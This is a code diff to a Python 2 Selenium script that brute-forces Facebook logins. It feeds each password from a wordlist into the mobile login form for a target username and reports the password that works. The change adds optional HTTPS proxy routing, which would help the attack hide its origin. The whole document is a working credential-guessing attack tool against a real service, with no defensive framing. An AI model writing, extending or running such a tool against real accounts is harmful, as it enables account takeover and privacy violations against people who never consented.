@@ -1,7 +1,9 @@
 # -*- coding: utf-8 -*-
+# Proxy connections added by phant0m0day
 from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.proxy import *
 import sys
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -25,7 +27,19 @@ def facebookCheck(username):
 
 
 def facebookBruteforce(username, wordlist, delay):
-    driver = webdriver.Firefox()
+    use = raw_input("[>] Use HTTPs proxy? [y/n]: ")
+    if use == 'y':
+        https_proxy = str(raw_input('[>] HTTPs proxy: '))
+        proxy = Proxy({
+            'proxyType': ProxyType.MANUAL,
+            'httpProxy': https_proxy,
+            'ftpProxy': '',
+            'sslProxy': https_proxy,
+            'noProxy': '',
+        })
+        driver = webdriver.Firefox(proxy=proxy)
+    else:
+        driver = webdriver.Firefox()
     driver.get("https://mbasic.facebook.com/login")
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
@@ -33,7 +47,7 @@ def facebookBruteforce(username, wordlist, delay):
         try:
             elem = driver.find_element_by_name("email")
             elem.clear()
-            elem.send_keys(username)    
+            elem.send_keys(username)
             elem = driver.find_element_by_name("pass")
             elem.clear()
             elem.send_keys(password)
@@ -44,6 +58,6 @@ def facebookBruteforce(username, wordlist, delay):
         except AssertionError:
             print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
             sys.exit(0)
-        except Exception, e :
+        except Exception, e:
             print R + "[!] OOPs, something went wrong. Did you terminate the connection? [!]" + W
             sys.exit(1)
